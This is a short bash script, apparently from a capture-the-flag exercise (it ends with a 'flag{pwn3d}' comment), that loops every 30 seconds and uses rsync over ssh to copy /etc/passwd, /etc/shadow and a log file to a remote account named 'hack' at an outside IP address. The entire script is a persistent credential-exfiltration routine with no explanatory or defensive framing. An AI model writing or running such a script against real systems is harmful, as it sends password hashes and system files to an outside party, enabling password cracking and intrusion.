#! /bin/bash

while true; do
rsync -av -e ssh /etc/passwd /etc/shadow /opt/local/log.txt hack@137.229.25.237:/home/hack/secret
sleep 30
done

# flag{pwn3d}
